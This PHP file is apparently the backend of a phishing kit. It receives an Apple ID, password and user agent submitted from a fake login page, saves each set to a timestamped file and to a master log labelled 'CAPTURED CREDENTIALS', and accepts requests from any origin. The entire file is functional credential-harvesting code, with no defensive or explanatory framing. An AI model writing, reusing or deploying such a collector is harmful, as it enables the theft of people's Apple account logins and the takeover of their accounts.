<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    // Create creds directory if it doesn't exist
    $credsDir = dirname(__DIR__) . '/creds';
    if (!file_exists($credsDir)) {
        mkdir($credsDir, 0755, true);
    }
    
    // Generate unique filename with timestamp
    $timestamp = date('Y-m-d_H-i-s');
    $filename = $credsDir . '/credentials_' . $timestamp . '.txt';
    
    $logEntry = sprintf(
        "═══════════════════════════════════════════════════════════════\n" .
        "CAPTURED CREDENTIALS\n" .
        "═══════════════════════════════════════════════════════════════\n" .
        "Timestamp:    %s\n" .
        "Apple ID:     %s\n" .
        "Password:     %s\n" .
        "User-Agent:   %s\n" .
        "═══════════════════════════════════════════════════════════════\n\n",
        date('Y-m-d H:i:s'),
        $data['appleid'],
        $data['password'],
        $data['userAgent']
    );
    
    file_put_contents($filename, $logEntry);
    
    // Also append to master log file
    $masterLog = $credsDir . '/all_credentials.log';
    file_put_contents($masterLog, $logEntry, FILE_APPEND);
    
    error_log("CAPTURED CREDENTIALS: " . $data['appleid']);
    
    echo json_encode(['status' => 'success']);
} else {
    echo json_encode(['status' => 'error']);
}
?>
